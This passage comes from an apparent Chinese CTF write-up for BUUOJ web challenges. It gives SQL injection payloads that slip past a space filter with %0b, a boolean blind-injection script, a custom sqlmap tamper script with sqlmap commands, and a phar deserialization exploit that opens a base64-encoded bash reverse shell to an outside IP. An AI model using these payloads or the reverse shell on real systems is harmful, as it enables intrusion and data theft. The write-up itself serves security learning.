<p>直接在查询中注入。过滤的是空格，用 <code>%0b</code> 绕过，这是竖直制表符”Vertical Tab”。关键词 <code>union, select, group_concat, from</code> 等等都没被过滤。通过联合查询注入即可取得flag。</p>
<p>自己尝试复现注入思路：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span>; # 拿不到数据库名</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(schema_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.schemata),<span class="number">2</span>; # 也拿不到数据库名</span><br></pre></td></tr></table></figure></div>

<p>上述payload是注入成功了（查询成功）但拿不到内容，原因是查询结果实际上是两行，只显示了第一行也就是本来的查询结果（虽然这里是空，因为库内的内容就是空），因此需要想办法获取到第二行的内容，有两种办法，一种是让第一行不见，如查询不存在的记录，把 <code>1</code> 改成 <code>-1</code> 或 <code>0</code> ；第二种是强行显示第二行的内容，加上 <code>limit%0b1,1</code> ：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span><span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b1,<span class="number">1</span>;</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span><span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b1,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> wfy</span><br></pre></td></tr></table></figure></div>

<p>同理注入表、字段内容即可：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 表名</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.tables<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_schema<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> wfy_admin,wfy_comments,wfy_information</span><br><span class="line"># 字段名</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.columns<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_name<span class="operator">=</span><span class="string">&#x27;wfy_comments&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> id,text,<span class="keyword">user</span>,name,display</span><br><span class="line"># flag</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>btext<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>bid<span class="operator">=</span><span class="string">&#x27;100&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> flag&#123;We_0nly_have_2wo_choices&#125;</span><br><span class="line"># 或者</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>btext<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>buser<span class="operator">=</span><span class="string">&#x27;f1ag_is_here&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> flag&#123;We_0nly_have_2wo_choices&#125;</span><br></pre></td></tr></table></figure></div>

<p>Union关键字执行的联合查询需要其后的查询结果与前面的主查询”等长”，即字段数量一样，尽管字段不同，但数量一样可以让两者规整地列在同一张表中。字段数量不同会导致查询失败，从web服务角度来讲也是”没查询到”或”查询失败”，因此需要测试主查询的字段数量。此处的name主查询只回显了一个发送人”user”，好像标题上还显示了一个查询”id”，但我们前面就知道这个查询id会被原样打回到前端，因此大概率不是查询的结果。在无法判断字段数量的情况下可以逐个添加无用字段尝试，直至查询成功，前提是你的查询语句本身没有错。另一种方式是利用关键字 <code>order by</code> 测试字段数量：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b1;	# 查询成功</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b2;	# 查询成功</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b3;	# 查询失败，说明只查了两个字段</span><br></pre></td></tr></table></figure></div>

<p>解出后回过头看这个sql查询，这里有一个误解，传入的参数虽然是name，但放在查询中它是id，因此这里可以确定为数字型参数，因此不用考虑引号，不过单引号并没有被过滤。</p>
<p>顺带一提，这里的注释符号虽然被过滤了，但是查询语句中直接用分号结束，语句后有多余的内容是不影响前面语句的正确运行的，因此在分号存在的情况下不需要注释符。（也有可能是数字型参数name后面本来就没东西了）</p>
<hr>
<p>试试sqlmap能不能解决这个联合注入。主要需要解决空白字符替换问题，手改脚本并调用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://afbf3b0a-165f-41d3-91c9-552f8f217462.node4.buuoj.cn:81/comments.php --data=<span class="string">&quot;name=1&quot;</span> --delay=0.1 --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span> --tamper=space2special.py</span><br><span class="line"> --technique=U --flush-session -b -f --answers=<span class="string">&quot;reduce=n,keep=n&quot;</span></span><br><span class="line"> </span><br><span class="line">-&gt; web application technology: OpenResty</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: active fingerprint: MySQL &gt;= 5.5</span><br><span class="line">               comment injection fingerprint: MySQL 5.6.52</span><br><span class="line">               banner parsing fingerprint: MySQL 10.1.47</span><br><span class="line">               fork fingerprint: MariaDB</span><br><span class="line">banner: <span class="string">&#x27;10.1.47-MariaDB-0ubuntu0.18.04.1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>-f -b</code> 获取指纹信息与banner信息，<code>--answers</code> 自动回答带指定内容的询问，<code>--flush-session</code> 刷新会话（SQLmap会记录URL的注入内容，若之前成功过则直接读取，二次测试时需要刷新掉）。可以看到注入成功，成功获取指纹信息与banner。</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>本题中的name的值会被原样显示在响应页面里，但实际上他会做运算处理如 <code>1+1, 2^3</code> 等，这是引号被过滤的情况下仍然能联合注入的原因，也是下面另一种盲注思路的支撑。</p>
<p>来自另一篇WP的name盲注思路：</p>
<p>观察到 <code>name=1</code> 和 <code>name=0</code> 结果不同，且name实际上为数字型参数（<code>name=0+1</code> 与 <code>name=0+1-1</code> 结果也不同），这里就可以进行布尔盲注，利用 <code>0+(2&gt;1)</code> 或 <code>0^(2&gt;1)</code> 等句式实现布尔结果影响回显内容：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取数据库名称</span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span>); # <span class="literal">true</span></span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">96</span>); # <span class="literal">true</span>,说明数据库名第一个字母是小写字母</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(database()<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>);	# <span class="literal">true</span>,得到数据库名称,后略</span><br></pre></td></tr></table></figure></div>

<p>放一个大佬WP中的盲注脚本：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">import requests, <span class="type">time</span></span><br><span class="line"># 爆破数据库名字</span><br><span class="line">def get_schema_name(url, schema_length):</span><br><span class="line">    # chars <span class="operator">=</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789!_,~&#x27;</span></span><br><span class="line">    flag <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, schema_length <span class="operator">+</span> <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">left</span> <span class="operator">=</span> <span class="number">32</span></span><br><span class="line">        <span class="keyword">right</span> <span class="operator">=</span> <span class="number">127</span></span><br><span class="line">        mid <span class="operator">=</span> (<span class="keyword">left</span> <span class="operator">+</span> <span class="keyword">right</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        while <span class="keyword">left</span> <span class="operator">&lt;</span> <span class="keyword">right</span>:</span><br><span class="line">            data <span class="operator">=</span> &#123;<span class="string">&#x27;name&#x27;</span>:f&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="keyword">left</span> <span class="operator">=</span> mid <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">right</span> <span class="operator">=</span> mid</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            mid <span class="operator">=</span> (<span class="keyword">left</span> <span class="operator">+</span> <span class="keyword">right</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        if mid <span class="operator">=</span><span class="operator">=</span> <span class="number">32</span> <span class="keyword">or</span> mid <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">            pass</span><br><span class="line">        flag <span class="operator">+</span><span class="operator">=</span> chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"># 爆破所有表</span><br><span class="line">def get_tables(url, schema_name):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;&#123;schema_name&#125;&#x27;)&quot;</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            data<span class="operator">=</span>&#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> chr(num) <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> &quot;~&quot;:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"># 爆破关键表的列</span><br><span class="line">def get_column_by_table(url, <span class="keyword">table</span>):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;&#123;table&#125;&#x27;)&quot;</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            data <span class="operator">=</span> &#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> num <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> &quot;~&quot;:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"># 爆破关键的具体字符 username password</span><br><span class="line">def get_value(url, <span class="keyword">table</span>, <span class="operator">*</span>columns):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    c <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">column</span> <span class="keyword">in</span> columns:</span><br><span class="line">        c <span class="operator">+</span><span class="operator">=</span> <span class="keyword">column</span> <span class="operator">+</span> &quot;,&#x27;-&#x27;,&quot;</span><br><span class="line">    print(c[:<span class="number">-5</span>])</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            # 根据提示应该是id<span class="operator">=</span><span class="number">100</span>有flag</span><br><span class="line">            <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(&#123;c[:-5]&#125;))from(&#123;table&#125;)where(id=100)&quot;</span><br><span class="line">            data <span class="operator">=</span> &#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            print(data)</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> num <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # 布尔盲注</span><br><span class="line">    session <span class="operator">=</span> requests.session()</span><br><span class="line">    # 成功的标识</span><br><span class="line">    success <span class="operator">=</span> <span class="string">&#x27;好耶！&#x27;</span></span><br><span class="line">    url <span class="operator">=</span> &quot;http://234d565f-bb2c-4daf-b44c-f8a6c546a4ec.node4.buuoj.cn:81/comments.php&quot;</span><br><span class="line">    # 数据库名字 wfy</span><br><span class="line">    # get_schema_name(url<span class="operator">=</span>url,schema_length<span class="operator">=</span><span class="number">3</span>)</span><br><span class="line">    # 获取表 wfy_admin,wfy_comments,wfy_information</span><br><span class="line">    # get_tables(url<span class="operator">=</span>url, schema_name<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>)</span><br><span class="line">    # 获得列名</span><br><span class="line">    # wfy_information:title,header</span><br><span class="line">    # wfy_comments:id,text,<span class="keyword">user</span>,name,display</span><br><span class="line">    # wfy_admin:Id,username,password,cookie</span><br><span class="line">    # get_column_by_table(url<span class="operator">=</span>url,<span class="keyword">table</span><span class="operator">=</span><span class="string">&#x27;wfy_admin&#x27;</span>)</span><br><span class="line">    # 具体字段 <span class="number">100</span><span class="operator">-</span>f1ag_is_here<span class="operator">-</span>You have <span class="keyword">no</span> way <span class="keyword">to</span> <span class="keyword">get</span> my F1AG<span class="operator">-</span>flag&#123;We_0nly_have_2wo_choices&#125;</span><br><span class="line">    # get_value(url,<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p>​		像这种布尔盲注用SQLmap并不能直接解决，设置布尔盲注后直接运行似乎也没能跑通，主要问题在于过滤了空格，且可替换的选项很少，<code>%0A,%09,/**/,#</code> 等全被过滤，sqlmap提供的脚本tamper中只有随机替换空格的脚本，没法稳定解决这个WAF，看了一下脚本都是python编写，尝试自己编写一个：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># space2special.py</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    blanks = (<span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>)	<span class="comment"># 只改了这里，元组长度必须要对上，就偷懒了一下没深究细节</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>写好的脚本需要放置在sqlmap默认脚本库中 <code>/usr/share/sqlmap/tamper/</code> 下，sqlmap能自动识别其中的脚本，同时脚本的启动需要该库中的 <code>__init__.py</code> 文件，因此不推荐使用绝对路径在别处运行脚本。</p>
<p>​		另一方面布尔盲注需要对比成功与失败，一方面要设置 <code>--string</code> 参数作为”查询成功”标记，同时还需要让原始请求能够到成功的请求，原始请求包：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/comments.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure></div>

<p><code>name=1</code> 是能够查询出结果的，查询成功的标志是字符串”好耶”。</p>
<p>随后使用上述脚本运行sqlmap，最低Level即可：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt --technique B -p <span class="string">&quot;name&quot;</span> --string=<span class="string">&#x27;好耶&#x27;</span> --delay=0.1 --tamper=space2special.py -D wfy -T wfy_comments -C text --dump --<span class="built_in">where</span> <span class="string">&quot;id=100&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>成功获得flag！</p>
<hr>
<p>补一个不从文件生成HTTP请求的用于Sqlmap的payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://51dfbe4c-9dca-4359-8e23-01b1dd2a2b45.node4.buuoj.cn:81/comments.php --method=POST --data=<span class="string">&quot;name=1&quot;</span> --delay=0.1 --tamper=space2special.py --technique B -v 3 --string=<span class="string">&quot;好耶&quot;</span> --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span> --flush-session</span><br></pre></td></tr></table></figure></div>

<p>要点在于给请求加上UA，若不加UA注不出结果。</p>
<h3 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h3><p>参考：<a class="link"   href="https://blog.csdn.net/m0_64815693/article/details/127307656" >WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/&gt;|&lt;|\?|php|&quot;.urldecode(&quot;%0a&quot;).&quot;/i&quot;</span><br></pre></td></tr></table></figure></div>

<p><code>%0a</code> 表示回车</p>
<p>主要利用<a class="link"   href="https://www.cnblogs.com/CoLo/p/16786627.html" >phar反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，上传一个压缩包保存为： <code>upload/0412c29576c708cf0155e8de242169b1.jpg</code> ，如下访问进行反序列化</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class.php?file=phar://upload/0412c29576c708cf0155e8de242169b1.jpg/test.php</span><br></pre></td></tr></table></figure></div>

<p>弹shell的EXP：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;\rsystem(&#x27;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84MS42OS4yMjcuMjA0LzIzMzM0IDA+JjEnCg== | base64 -d | bash&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>

<p>这里采用base64绕过的方式进行反弹shell，实际执行的语句为：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/81.69.227.204/23334 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>%0a == \n</code> 换行符被过滤了，为了绕过前置注释符还可使用回车 <code>\r</code> </p>
<p>生成phar文件后改后缀为gif上传”test.gif”，保存为 <code>tmp/6ab7f8f0de1325b480be3294591342b5.gif</code> ，访问：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php?file=phar:<span class="comment">//upload/0412c29576c708cf0155e8de242169b1.jpg/test.php</span></span><br></pre></td></tr></table></figure></div>

<p>在本地访问时需要改为：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php?file=phar:<span class="comment">//upload/0412c29576c708cf0155e8de242169b1.jpg/test.php/test.txt</span></span><br></pre></td></tr></table></figure></div>

